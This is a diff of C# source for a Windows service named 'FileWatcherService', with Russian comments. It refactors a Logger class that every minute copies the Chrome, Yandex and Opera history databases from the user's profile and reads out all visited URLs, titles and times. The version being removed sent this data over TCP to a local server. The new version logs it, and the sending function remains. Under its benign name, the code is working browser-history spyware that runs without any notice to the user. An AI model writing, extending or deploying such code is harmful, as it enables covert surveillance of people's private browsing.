@@ -98,7 +98,7 @@ namespace FileWatcherService
 
     class Logger
     {
-
+        #region свойства службы
         const int port = 8888;
         const string address = "127.0.0.1";
         public string UserName { get; set; }
@@ -106,7 +106,9 @@ namespace FileWatcherService
         bool enabled = true;
         TcpClient client = null;
         NetworkStream stream = null;
+        #endregion
 
+        #region логика службы
         public Logger(string name)
         {
             try
@@ -117,160 +119,23 @@ namespace FileWatcherService
             catch (Exception ex) { }
             UserName = name;
         }
-
-        /// <summary>
-        /// Копирование файла истории Opera
-        /// </summary>
-        private void copyHistoryOpera()
-        {
-            try
-            {
-                string opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
-                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\");
-                foreach (var f in files)
-                {
-
-                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
-                    {
-                        opera = Path.GetFullPath(f);
-
-                    }
-                }
-
-                using (FileStream ms = new FileStream(opera, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
-                {
-                    ms.Seek(0, SeekOrigin.Begin);
-                    byte[] buffer = new byte[ms.Length];
-                    int len;
-                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
-                    {
-
-                    }
-
-                    File.WriteAllBytes("D:\\historyOpera.db", buffer);
-                    //readHistory();
-                }
-                opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
-            }
-            catch (Exception ex)
-            {
-                RecordEntry(ex.Message);
-            }
-        }
-
-        /// <summary>
-        /// Копирование файла истории Yandex
-        /// </summary>
-        private void copyHistoryYandex()
-        {
-            try
-            {
-                string yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";
-
-                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\");
-                foreach (var f in files)
-                {
-
-                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
-                    {
-                        yandex = Path.GetFullPath(f);
-
-                    }
-                }
-
-                using (FileStream ms = new FileStream(yandex, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
-                {
-                    ms.Seek(0, SeekOrigin.Begin);
-                    byte[] buffer = new byte[ms.Length];
-                    int len;
-                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
-                    {
-
-                    }
-
-                    File.WriteAllBytes("D:\\historyYandex.db", buffer);
-                    //readHistory();
-                }
-                yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";
-
-            }
-            catch (Exception ex)
-            {
-                RecordEntry(ex.Message);
-            }
-        }
-
-
-
-
-        /// <summary>
-        /// Копирование файла истории Google
-        /// </summary>
-        private void copyHistoryGoogle()
-        {
-            try
-            {
-
-                string google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";
-
-                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
-                foreach (var f in files)
-                {
-
-                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
-                    {
-                        google = Path.GetFullPath(f);
-
-                    }
-                }
-
-                if (File.Exists("D:\\historyGoogle.db"))
-                {
-                    File.Delete("D:\\historyGoogle.db");
-                }
-
-                using (FileStream ms = new FileStream(google, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
-                {
-                    ms.Seek(0, SeekOrigin.Begin);
-                    byte[] buffer = new byte[ms.Length];
-                    int len;
-                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
-                    {
-
-                    }
-
-                    File.WriteAllBytes("D:\\historyGoogle.db", buffer);
-                    ms.Close();
-                    ms.Dispose();
-                }
-                google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";
-
-            }
-            catch (Exception ex)
-            {
-                RecordEntry(ex.Message);
-            }
-        }
-
         public void Start()
         {
-
-
-
             while (enabled)
             {
                 try
                 {
                     Thread.Sleep(60000);
-                    copyHistoryGoogle();
-                    SendToServer("google", ReadGoogleDataBase());
-                    copyHistoryYandex();
-                    SendToServer("yandex", ReadYandexDataBase());
-                    copyHistoryOpera();
-                    SendToServer("opera", ReadOperaDataBase());
 
-
-
+                    CopyBrowserHistory("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default\");
+                    RecordEntry(("-------------------------------------------Yandex"));
+                    RecordEntry(ReadBrowserHistory("Yandex"));
+                    CopyBrowserHistory("Opera", @"Roaming\Opera Software\Opera Stable\");
+                    RecordEntry(("-------------------------------------------Опера"));
+                    RecordEntry(ReadBrowserHistory("Opera"));
+                    CopyBrowserHistory("Google", @"Local\Google\Chrome\User Data\Default\");
+                    RecordEntry(("-------------------------------------------Массоны"));
+                    RecordEntry(ReadBrowserHistory("Google"));
                     GC.Collect();
                 }
                 catch (Exception d)
@@ -286,15 +151,65 @@ namespace FileWatcherService
 
             }
         }
-        private void SendToServer(string browserName, string data)
+
+        public void Stop()
         {
-            byte[] data_bytes = Encoding.Unicode.GetBytes(browserName + "|" + data);
-            stream.Write(data_bytes, 0, data_bytes.Length);
+
+            enabled = false;
+        }
+#endregion
+        #region копирование истории браузеров
+        private void CopyBrowserHistory(string brawseName, string brawserPath)
+        {
+            try
+            {
+
+                string google = $@"C:\Users\{UserName}\AppData\{brawserPath}";
+
+                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\{brawserPath}");
+                foreach (var f in files)
+                {
+
+                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
+                    {
+                        google = Path.GetFullPath(f);
+
+                    }
+                }
+
+                if (File.Exists($"D:\\history{brawseName}.db"))
+                {
+                    File.Delete($"D:\\history{brawseName}.db");
+                }
+
+                using (FileStream ms = new FileStream(google, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
+                {
+                    ms.Seek(0, SeekOrigin.Begin);
+                    byte[] buffer = new byte[ms.Length];
+                    int len;
+                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+
+                    }
+
+                    File.WriteAllBytes($"D:\\history{brawseName}.db", buffer);
+                    ms.Close();
+                    ms.Dispose();
+                }
+                google = $@"C:\Users\{UserName}\AppData\Local\{brawserPath}";
+
+            }
+            catch (Exception ex)
+            {
+                RecordEntry(ex.Message);
+            }
         }
 
-        const string databaseName = @"D:\\historyGoogle.db";
-        private string ReadGoogleDataBase()
+        #endregion
+        #region чтение данных с бд
+        private string ReadBrowserHistory(string brawserName)
         {
+            string databaseName = @"D:\\history" + brawserName + ".db";
             try
             {
 
@@ -372,185 +287,15 @@ namespace FileWatcherService
             }
             return String.Empty;
         }
-
-
-
-
-        const string YandexdatabaseName = @"D:\\historyYandex.db";
-        private string ReadYandexDataBase()
+        #endregion
+        #region отправка на сервер
+        private void SendToServer(string browserName, string data)
         {
-            try
-            {
-
-                if (File.Exists(YandexdatabaseName))
-                {
-
-                    string lastTime = null;
-                    string tmpPath = "D:\\tmpYandex.txt";
-                    if (lastTime == null)
-                        lastTime = DateTime.Now.ToString();
-                    if (File.Exists(tmpPath))
-                    {
-
-                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
-                        {
-                            // преобразуем строку в байты
-                            byte[] array = new byte[f.Length];
-                            // считываем данные
-                            f.Read(array, 0, array.Length);
-                            // декодируем байты в строку
-                            lastTime = Encoding.Default.GetString(array);
-
-                        }
-                    }
-
-                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={YandexdatabaseName};")))
-                    {
-
-                        connection.Open();
-                        StringBuilder stringBuilder = new StringBuilder();
-
-                        DbDataReader r = null;
-
-                        if (DateTime.Parse(lastTime) < DateTime.Now)
-                        {
-
-                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
-
-                        }
-                        else
-                        {
-
-                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
-                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
-                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();
-
-                        }
-                        if (r.HasRows)
-                        {
-
-                            while (r.Read())
-                            {
-                                stringBuilder.Append("title:\t");
-                                stringBuilder.Append(r.GetValue(2));
-                                stringBuilder.Append("\turl:\t");
-                                stringBuilder.Append(r.GetValue(1));
-                                stringBuilder.Append("\tlast time:\t");
-                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
-                                stringBuilder.Append("\r\n\r");
-                            }
-                        }
-
-                        return stringBuilder.ToString();
-
-                        //using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
-                        //{
-                        //    f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
-                        //}
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                RecordEntry(ex.Message);
-            }
-            return String.Empty;
+            byte[] data_bytes = Encoding.Unicode.GetBytes(browserName + "|" + data);
+            stream.Write(data_bytes, 0, data_bytes.Length);
         }
-
-
-
-        const string OperadatabaseName = @"D:\\historyOpera.db";
-        private string ReadOperaDataBase()
-        {
-            try
-            {
-
-                if (File.Exists(OperadatabaseName))
-                {
-
-                    string lastTime = null;
-                    string tmpPath = "D:\\tmpOpera.txt";
-                    if (lastTime == null)
-                        lastTime = DateTime.Now.ToString();
-                    if (File.Exists(tmpPath))
-                    {
-
-                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
-                        {
-                            // преобразуем строку в байты
-                            byte[] array = new byte[f.Length];
-                            // считываем данные
-                            f.Read(array, 0, array.Length);
-                            // декодируем байты в строку
-                            lastTime = Encoding.Default.GetString(array);
-
-                        }
-                    }
-
-                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={OperadatabaseName};")))
-                    {
-
-                        connection.Open();
-                        StringBuilder stringBuilder = new StringBuilder();
-
-                        DbDataReader r = null;
-
-                        if (DateTime.Parse(lastTime) < DateTime.Now)
-                        {
-
-                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
-
-                        }
-                        else
-                        {
-
-                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
-                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
-                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();
-
-                        }
-                        if (r.HasRows)
-                        {
-
-                            while (r.Read())
-                            {
-                                stringBuilder.Append("title:\t");
-                                stringBuilder.Append(r.GetValue(2));
-                                stringBuilder.Append("\turl:\t");
-                                stringBuilder.Append(r.GetValue(1));
-                                stringBuilder.Append("\tlast time:\t");
-                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
-                                stringBuilder.Append("\r\n\r");
-                            }
-                        }
-
-                        return stringBuilder.ToString();
-
-                        //using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
-                        //{
-                        //    f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
-                        //}
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                RecordEntry(ex.Message);
-            }
-
-            return String.Empty;
-        }
-
-
-
-
-        public void Stop()
-        {
-
-            enabled = false;
-        }
-
-
+        #endregion
+        #region Логгирование
         public void RecordEntry(string fileEvent, bool isError = true)
         {
             lock (obj)
@@ -563,5 +308,6 @@ namespace FileWatcherService
                 }
             }
         }
+        #endregion
     }
 }
